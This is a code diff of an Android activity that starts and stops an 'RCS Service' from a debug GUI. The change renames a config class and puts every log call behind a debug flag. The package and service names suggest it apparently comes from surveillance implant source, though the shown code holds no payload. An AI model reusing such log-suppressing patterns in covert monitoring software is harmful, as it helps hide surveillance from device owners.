@@ -20,7 +20,7 @@ import android.widget.Button;
 import android.widget.ToggleButton;
 
 import com.android.service.R;
-import com.android.service.auto.AutoConfig;
+import com.android.service.auto.Cfg;
 
 /**
  * The Class AndroidServiceGUI.
@@ -37,7 +37,7 @@ public class AndroidServiceGUI extends Activity {
 	 */
 	@Override
 	public void onCreate(final Bundle savedInstanceState) {
-		if(AutoConfig.DEBUG){
+		if(Cfg.DEBUG){
 			actualCreate(savedInstanceState);
 		}
 	}
@@ -57,22 +57,22 @@ public class AndroidServiceGUI extends Activity {
 						final ComponentName cn = startService(new Intent(service));
 
 						if (cn == null) {
-							Log.d("QZ", TAG + " RCS Service not started : " + cn.flattenToShortString());
+							if(Cfg.DEBUG) Log.d("QZ", TAG + " RCS Service not started : " + cn.flattenToShortString());
 						} else {
-							Log.d("QZ", TAG + " RCS Service Name: " + cn.flattenToShortString());
+							if(Cfg.DEBUG) Log.d("QZ", TAG + " RCS Service Name: " + cn.flattenToShortString());
 						}
 					} catch (final SecurityException se) {
-						Log.d("QZ", TAG + " SecurityException caught on startService()");
+						if(Cfg.DEBUG) Log.d("QZ", TAG + " SecurityException caught on startService()");
 					}
 				} else {
 					try {
 						if (stopService(new Intent(service)) == true) {
-							Log.d("QZ", TAG + " RCS Service " + service + " stopped");
+							if(Cfg.DEBUG) Log.d("QZ", TAG + " RCS Service " + service + " stopped");
 						} else {
-							Log.d("QZ", TAG + " RCS Service " + service + " doesn't exist");
+							if(Cfg.DEBUG) Log.d("QZ", TAG + " RCS Service " + service + " doesn't exist");
 						}
 					} catch (final SecurityException se) {
-						Log.d("QZ", TAG + " SecurityException caught on stopService()");
+						if(Cfg.DEBUG) Log.d("QZ", TAG + " SecurityException caught on stopService()");
 					}
 				}
 			}
